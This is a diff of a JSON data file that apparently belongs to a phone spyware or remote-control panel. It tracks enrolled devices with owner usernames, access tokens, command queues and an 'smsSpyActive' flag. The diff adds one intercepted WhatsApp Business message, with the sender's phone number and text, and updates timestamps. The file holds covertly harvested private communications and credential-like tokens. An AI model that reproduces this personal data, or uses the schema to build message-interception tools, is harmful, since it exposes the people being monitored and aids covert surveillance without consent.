@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777780534497,
+    "lastSeen": 1777780543475,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -2549,6 +2549,14 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "WA Business",
+        "sender": "+62 896-7370-4325",
+        "content": "Web bug masih ada ga",
+        "time": "03/05 10:55",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777780546117
+      },
+      {
         "appName": "Messages",
         "sender": "",
         "content": "Messages is doing work in the background",
@@ -2693,7 +2701,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777780534558,
+    "lastSeen": 1777780543651,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
